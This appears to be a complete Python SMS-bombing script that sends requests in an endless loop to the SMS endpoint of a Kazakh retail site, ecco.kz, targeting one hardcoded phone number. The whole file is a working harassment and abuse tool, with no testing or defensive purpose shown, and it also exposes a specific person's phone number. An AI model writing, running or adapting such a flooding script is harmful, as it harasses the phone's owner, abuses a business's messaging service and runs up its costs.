import requests
import asyncio

url = 'https://ecco.kz/ajax_send_sms.php'
phone_number =  '+7 (702) 289-89-26'

def send_sms():
    res = requests.post(url, data={
        'phone': phone_number,
        'action': 'send_sms_order'
    })
    print(res.status_code)
    
while True:
    send_sms()